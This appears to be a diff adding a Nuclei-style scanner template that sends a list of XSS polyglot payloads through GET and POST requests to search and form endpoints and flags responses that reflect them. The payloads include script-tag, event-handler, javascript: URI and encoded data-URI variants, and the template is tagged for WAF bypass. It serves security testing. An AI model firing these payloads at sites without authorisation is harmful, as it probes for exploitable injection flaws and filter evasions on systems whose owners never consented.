@@ -1,0 +1,48 @@
+id: polyglot-p1
+
+info:
+  name: Polyglot Payloads - Mixed Context
+  author: custom
+  severity: high
+  description: Polyglot payloads that work in multiple contexts (XSS, SQLi, etc.)
+  tags: polyglot,xss,waf-bypass,multi-context
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?q={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        q={{payload}}
+
+    payloads:
+      payload:
+        - 'javascript://%250Aalert(1)//"  /*'
+        - '\'"><script>alert(1)</script>'
+        - '" onfocus=alert(1) "'
+        - "javascript:alert(1)"
+        - "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+        - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/"
+        - "<script>+-+-1-+-+alert(1)</script>"
+        - "%22%3e%3cscript%3ealert(1)%3c%2fscript%3e"
+        - '"><img src=x onerror=alert(1)>'
+        - "''!--\"<XSS>=&{()}"
+      path:
+        - "search"
+        - "input"
+        - "form"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "<script>"
+          - "javascript:"
+        condition: or
